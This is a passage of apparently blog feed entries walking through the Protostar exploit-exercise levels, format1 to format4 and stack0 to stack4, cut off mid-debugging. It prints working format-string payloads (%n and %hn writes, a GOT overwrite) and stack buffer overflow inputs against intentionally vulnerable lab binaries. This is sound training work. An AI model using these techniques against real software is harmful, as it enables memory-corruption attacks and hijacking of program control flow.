AAAAAAAA00804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff830.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.947fee7e.be2b786e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff826.bffff830.0.bffff9ba.bffff9c8.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.78bf3ff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.6b000000.87c2a0a8.f580b5c9.a30e6569.69f7f8e0.363836.0.2f2e0000.6d726f66.317461.41414141
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now that we have the correct position we need to replace the &amp;ldquo;A&amp;rdquo;&amp;rsquo;s with the address of our &lt;code&gt;target&lt;/code&gt; variable.
We can find it with the objdump command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss	00000004              target
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After we insert our address (little endian) we can also replace the last &lt;code&gt;%x&lt;/code&gt; with the &lt;code&gt;%n&lt;/code&gt;. This modifier writes to the specified address instead of displaying the contents. Now we can pass this level:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `python -c &amp;quot;print &#39;\x38\x96\x04\x08AAAA00&#39; + &#39;%x.&#39;*127&amp;quot;`%n
8ï¿½AAAA00804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff830.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.aaa339a8.80f7afb8.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff826.bffff830.0.bffff9ba.bffff9c8.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.78bf3ff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.b8000000.ecbb7eda.506baaa7.48d611bb.69d839a6.363836.0.2f2e0000.6d726f66.317461.you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;format2:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Format2&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;This level moves on from format1 and shows how specific values can be written in memory.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/format2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-2:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf(&amp;quot;you have modified the target :)\n&amp;quot;);
  } else {
      printf(&amp;quot;target is %d :(\n&amp;quot;, target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level builds on the previous level by requiring to overwrite the &lt;code&gt;target&lt;/code&gt; with a specific value (decimal 64).
Similarly to the previous level we need to find our input on the stack. This time, however, the input is being read from stdin instead of being passed as an argument.
Also the payload is a lot closer to the top of the stack:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;AAAAAAAA&#39; + &#39;%x.&#39;*5&amp;quot;` | ./format2
AAAAAAAA200.b7fd8420.bffff624.41414141.41414141.
target is 0 :(
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Similarly, we find the address of the &lt;code&gt;target&lt;/code&gt; variable and test if we can precisely display and overwrite the address:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
080496e4 g     O .bss	00000004              target
user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;AAAA\xe4\x96\x04\x08&#39; + &#39;%x.&#39;*4&amp;quot;`%x | ./format2
AAAAï¿½ï¿½200.b7fd8420.bffff624.41414141.80496e4
target is 0 :(
user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;AAAA\xe4\x96\x04\x08&#39; + &#39;%x.&#39;*4&amp;quot;`%n | ./format2
AAAAï¿½ï¿½200.b7fd8420.bffff624.41414141.
target is 39 :(
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can adjust the payload a little bit to overwrite the target with exact value of 64. First we change the &amp;ldquo;&amp;lsquo;%x.&amp;rsquo;*4&amp;rdquo; to &amp;ldquo;%x%x%x%x&amp;rdquo; and then we can adjust
the width of one of the &lt;code&gt;%x&lt;/code&gt; modifiers to hit the precise byte value:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;AAAA\xe4\x96\x04\x08&#39; + &#39;%x%x%x%x&#39;&amp;quot;`%n | ./format2
AAAAï¿½ï¿½200b7fd8420bffff62441414141
target is 35 :(
user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;AAAA\xe4\x96\x04\x08&#39; + &#39;%32x%x%x%x&#39;&amp;quot;`%n | ./format2
AAAAï¿½ï¿½                             200b7fd8420bffff62441414141
you have modified the target :)
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;format3:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Format3&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/format3&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-3:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf(&amp;quot;you have modified the target :)\n&amp;quot;);
  } else {
      printf(&amp;quot;target is %08x :(\n&amp;quot;, target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level advances from format2 and requires us to write a specific 4 byte value into the &lt;code&gt;target&lt;/code&gt; memory address.
First we find the exact address of the &lt;code&gt;target&lt;/code&gt; variable:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target
080496f4 g     O .bss	00000004              target
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can write the full 4 byte value &lt;code&gt;0x01025544&lt;/code&gt; using four writes. If we shift the address each time by one byte we should be able to effectively write
1 byte into target address with each write. The whole process of overwriting the target address should roughly look like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Memory Address	
0x080496f4        44 00 00 00
0x080496f5           55 00 00 00 
0x080496f6              02 00 00 00
0x080496f7                 01 00 00 00
		  44 55 02 01	
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To further simplify the process of multiple writes we can use a technique called &amp;ldquo;Direct Parameter Access&amp;rdquo; (DPA). It allows to directly address a stack
parameter from within the format string. The DPA is controlled by the &amp;ldquo;$&amp;rdquo; qualifier. For example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf (&amp;quot;%6$d\n&amp;quot;, 6, 5, 4, 3, 2, 1);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This prints &amp;ldquo;1&amp;rdquo;, because &amp;ldquo;6$&amp;rdquo; explicitly addresses the 6th parameter on the stack.&lt;/p&gt;

&lt;p&gt;In our case, the input lies as the 12th parameter on the stack:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAA%12\$x | ./format3
AAAA41414141
target is 00000000 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can start overwriting the target memory by writing into four consecutive addresses and addressing them as &lt;code&gt;$12&lt;/code&gt;, &lt;code&gt;$13&lt;/code&gt;, &lt;code&gt;$14&lt;/code&gt; and &lt;code&gt;$15&lt;/code&gt; using the DPA:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08&#39;&amp;quot;`%12\$n%13\$n%14$\n%15\$n | ./format3
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
target is 10101010 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have overwritten the target with &lt;code&gt;0x10&lt;/code&gt;&amp;rsquo;s (16 - four 4-byte addresses). We can now adjust the values written by using the &lt;code&gt;%x&lt;/code&gt; width modifiers.
We can use gdb to calculate the exact values:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb -q
(gdb) p 0x44 - 0x10
$1 = 52
(gdb) p 0x55 - 0x44
$2 = 17
(gdb) p 0x102 - 0x55
$3 = 173
(gdb) p 0x101 - 0x02
$4 = 255
(gdb) quit
user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08&#39;&amp;quot;`%52x%12\$n%17x%13\$n%173x%14$\n%255x%15\$n | ./format3
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½                                                   0         bffff5e0                                                                                                                                                                     b7fd7ff4                                                                                                                                                                                                                                                              0
you have modified the target :)
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;using-short-writes:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Using Short Writes&lt;/h5&gt;

&lt;p&gt;We can achieve the same effect of writing a full 4-byte value by doing just two write operations. We can use a special write operation which writes
short int types - the &lt;code&gt;%hn&lt;/code&gt; parameter. Not only it shortens the exploit string itself, it also prevents a side effect of overwriting additional memory.
We can refer to the previous chapter and see that with four write method we overwrote additional 3 bytes after the target address with &lt;code&gt;0x00&lt;/code&gt;. This can
have side effects if that memory stores important information (such as a pointer to some function).&lt;/p&gt;

&lt;p&gt;So using the short write method our exploit looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb -q
(gdb) p 0x5544 - 8
$1 = 21820
(gdb) p 0x10102 - 0x5544
$2 = 43966
(gdb) quit
user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;\xf4\x96\x04\x08\xf6\x96\x04\x08&#39;&amp;quot;`%21820x%12\$hn%43966x%13\$hn | ./format3
...( HUGE amount of space)...

                                   bffff5e0
you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;format4:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Format4&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;%p format4 looks at one method of redirecting execution in a process.&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;objdump -TR is your friend&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This level is at /opt/protostar/bin/format4&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-4:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void hello()
{
  printf(&amp;quot;code execution redirected! you win\n&amp;quot;);
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this level we need to alter code execution flow and execute the &lt;code&gt;hello()&lt;/code&gt; function.
The easiest method would be to overwrite the &lt;code&gt;exit()&lt;/code&gt; functions address in the global offset table (GOT) with the address of the &lt;code&gt;hello()&lt;/code&gt;.
This way when the program tries to exit (after printf) it will execute our code instead.&lt;/p&gt;

&lt;p&gt;First we examine the GOT and find the entry for the &lt;code&gt;exit()&lt;/code&gt; at &lt;code&gt;0x08049724&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -TR format4

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   fgets
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   printf
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000      DF *UND*	00000000  GLIBC_2.0   exit
080485ec g    DO .rodata	00000004  Base        _IO_stdin_used
08049730 g    DO .bss	00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit

user@protostar:/opt/protostar/bin$ objdump -t format4 | grep hello
080484b4 g     F .text	0000001e              hello
user@protostar:/opt/protostar/bin$ 

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The address of the &lt;code&gt;hello&lt;/code&gt; function is &lt;code&gt;0x080484b4&lt;/code&gt;. So now we need to write this address into the GOT entry for the &lt;code&gt;exit&lt;/code&gt; function (at &lt;code&gt;0x08049724&lt;/code&gt;).
Our input string is the $4 parameter (DPA):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAA`python -c &amp;quot;print &#39;%x.&#39;*20&amp;quot;` | ./format4
AAAA200.b7fd8420.bffff624.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.a.
user@protostar:/opt/protostar/bin$ echo AAAA%4\$x | ./format4
AAAA41414141
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now using the short write method we write a couple of test values first (this makes the program segfault) and later correct them with the help of gdb:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;\x24\x97\x04\x08\x26\x97\x04\x08&#39;&amp;quot;`%4\$hn%5\$hn | ./format4
$ï¿½&amp;amp;ï¿½
Segmentation fault
user@protostar:/opt/protostar/bin$ gdb -q
(gdb) p 0x84b4 - 8
$1 = 33964
(gdb) p 0x10804 - 0x84b4
$2 = 33616
(gdb) quit
user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;\x24\x97\x04\x08\x26\x97\x04\x08&#39;&amp;quot;`%33964x%4\$hn%33616x%5\$hn | ./format4
...( HUGE amount of space)...
                      b7fd8420
code execution redirected! you win
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Protostar Exploit Exercises - Stack Levels</title>
      <link>http://mislusnys.github.io/blog/2016/06/19/protostar-exploit-exercises---stack-levels/</link>
      <pubDate>Sun, 19 Jun 2016 13:37:33 -0400</pubDate>
      
      <guid>http://mislusnys.github.io/blog/2016/06/19/protostar-exploit-exercises---stack-levels/</guid>
      <description>

&lt;h2 id=&#34;intro:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Intro&lt;/h2&gt;

&lt;p&gt;The Protostar VM is the next progression step after Nebula (Exploit Exercises).&lt;/p&gt;

&lt;p&gt;Protostar introduces the following in a friendly way:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Network programming&lt;/li&gt;
&lt;li&gt;Byte order&lt;/li&gt;
&lt;li&gt;Handling sockets&lt;/li&gt;
&lt;li&gt;Stack overflows&lt;/li&gt;
&lt;li&gt;Format strings&lt;/li&gt;
&lt;li&gt;Heap overflows&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.&lt;/p&gt;

&lt;p&gt;In this post I will detail my attempt at solving the stack levels of this VM.&lt;/p&gt;

&lt;h3 id=&#34;stack0:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack0&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack0&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf(&amp;quot;you have changed the &#39;modified&#39; variable\n&amp;quot;);
  } else {
      printf(&amp;quot;Try again?\n&amp;quot;);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, the stack layout while inside the &lt;code&gt;main()&lt;/code&gt; function would look something like the following figure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/06/19/stack.png&#34; alt=&#34;stack&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The user&amp;rsquo;s input is stored inside the allocated 64 byte buffer. If we supply any input which is more than 64 bytes, we can overwrite arbitrary values on the stack.
So if we supply 65 &amp;ldquo;A&amp;rdquo;&amp;rsquo;s as input, we should be able to overwrite the &lt;code&gt;modified&lt;/code&gt; variable and pass this level:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ python -c &#39;print &amp;quot;A&amp;quot;*65&#39; | ./stack0
you have changed the &#39;modified&#39; variable
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack1:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack1&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack1&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-1:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, &amp;quot;please specify an argument\n&amp;quot;);
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf(&amp;quot;you have correctly got the variable to the right value\n&amp;quot;);
  } else {
      printf(&amp;quot;Try again, you got 0x%08x\n&amp;quot;, modified);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To pass this level, we need to modify the &lt;code&gt;modified&lt;/code&gt; variable to a specific value - &lt;code&gt;0x61626364&lt;/code&gt;. This translates to ascii as the string &lt;code&gt;abcd&lt;/code&gt;. However, because the values on the stack are stored in &amp;lsquo;little endian&amp;rsquo; format - we need to overwrite the address with &lt;code&gt;dcba&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./stack1 $(python -c &#39;print &amp;quot;A&amp;quot;*64 + &amp;quot;dcba&amp;quot;&#39;)
you have correctly got the variable to the right value
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack2:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack2&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack2 looks at environment variables, and how they can be set.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-2:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv(&amp;quot;GREENIE&amp;quot;);

  if(variable == NULL) {
      errx(1, &amp;quot;please set the GREENIE environment variable\n&amp;quot;);
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf(&amp;quot;you have correctly modified the variable\n&amp;quot;);
  } else {
      printf(&amp;quot;Try again, you got 0x%08x\n&amp;quot;, modified);
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level is very similar to the previous one. Here, however, we need to set the &lt;code&gt;GREENIE&lt;/code&gt; environment variable with our payload which later will be copied to the buffer.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ export GREENIE=`python -c &amp;quot;print &#39;A&#39;*64+&#39;\x0a\x0d\x0a\x0d&#39;&amp;quot;`
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack3:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack3&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;both gdb and objdump is your friend you determining where the win() function lies in memory.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack3&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-3:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void win()
{
  printf(&amp;quot;code flow successfully changed\n&amp;quot;);
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf(&amp;quot;calling function pointer, jumping to 0x%08x\n&amp;quot;, fp);
      fp();
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this level we need to overwrite the &lt;code&gt;fp&lt;/code&gt; pointer with the address of the &lt;code&gt;win()&lt;/code&gt; function.
First, we should find the address of the &lt;code&gt;win&lt;/code&gt; function and then, similarly to previous levels, we can overwrite the pointer with (little endian format) address of the &amp;ldquo;winning&amp;rdquo; function:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t stack3 | grep win
08048424 g     F .text	00000014              win
user@protostar:/opt/protostar/bin$ python -c &amp;quot;print &#39;A&#39;*64+&#39;\x24\x84\x04\x08&#39;&amp;quot; | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack4:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack4&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack4 takes a look at overwriting saved EIP and standard buffer overflows.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack4&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A variety of introductory papers into buffer overflows may help.&lt;/li&gt;
&lt;li&gt;gdb lets you do â€œrun &amp;lt; inputâ€&lt;/li&gt;
&lt;li&gt;EIP is not directly after the end of buffer, compiler padding can also increase the size.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-4:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void win()
{
  printf(&amp;quot;code flow successfully changed\n&amp;quot;);
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While normally it would be easiest to exploit a standard buffer overflow using &lt;code&gt;pattern_create&lt;/code&gt; and &lt;code&gt;pattern_offset&lt;/code&gt; tools from the Metasploit Framework,
this level was intended to be solved using only gdb. Let&amp;rsquo;s do it the &amp;ldquo;hard way&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;First, we setup the payload to be the exact size of our buffer (64 bytes):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ python -c &amp;quot;print &#39;A&#39;*64&amp;quot; &amp;gt; /tmp/payload
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can put the breakpoint just before returning from the &lt;code&gt;main&lt;/code&gt; (on the &lt;code&gt;ret&lt;/code&gt; instruction) and examine the stack.
Since we have fully filled the buffer, we can easily see where the buffer lies on the stack in relation to the saved return address:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb -q stack4
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) disass main
Dump of assembler code for function main:
0x08048408 &amp;lt;main+0&amp;gt;:	push   %ebp
0x08048409 &amp;lt;main+1&amp;gt;:	mov    %esp,%ebp
0x0804840b &amp;lt;main+3&amp;gt;:	and    $0xfffffff0,%esp
0x0804840e &amp;lt;main+6&amp;gt;:	sub    $0x50,%esp
0x08048411 &amp;lt;main+9&amp;gt;:	lea    0x10(%esp),%eax
0x08048415 &amp;lt;main+13&amp;gt;:	mov    %eax,(%esp)
0x08048418 &amp;lt;main+16&amp;gt;:	call   0x804830c &amp;lt;gets@plt&amp;gt;
0x0804841d &amp;lt;main+21&amp;gt;:	leave  
0x0804841e &amp;lt;main+22&amp;gt;:	ret    
End of assembler dump.
(gdb) break *main+22
Breakpoint 1 at 0x804841e: file stack4/stack4.c, line 16.
(gdb) run &amp;lt; /tmp/payload
Starting program: /opt/protostar/bin/stack4 &amp;lt; /tmp/payload

Breakpoint 1, 0x0804841e in main (argc=134513672, argv=0x1) at stack4/stack4.c:16
16	stack4/stack4.c: No such file or directory.
	in stack4/stack4.c
(gdb) x/16x $esp
0xbffff75c:	0xb7eadc76	0x00000001	0xbffff804	0xbffff80c
0xbffff76c:	0xb7fe1848	0xbffff7c0	0xffffffff	0xb7ffeff4
0xbffff77c:	0x0804824b	0x00000001	0xbffff7c0	0xb7ff0626
